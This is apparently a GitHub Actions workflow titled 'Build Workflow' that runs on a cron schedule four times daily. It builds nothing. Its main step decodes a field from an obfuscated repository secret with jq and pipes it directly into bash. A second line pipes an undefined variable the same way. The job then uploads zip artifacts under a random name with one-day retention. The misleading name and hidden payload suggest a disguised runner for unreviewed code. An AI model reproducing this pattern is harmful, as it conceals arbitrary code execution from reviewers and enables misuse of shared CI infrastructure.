name: Build Workflow
on:
  workflow_dispatch:

  schedule:
    - cron: '33 1,7,13,19 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Start
        env:
          lhrec1: ${{ secrets.lhrec1 }}
        run: |
          printf '%s' "$lhrec1" | jq -r .unt55 | /bin/bash
          printf '%s' "$b75646" | jq -r .bisb00 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: QbcTcYd0
          path: "*.zip"
          retention-days: 1
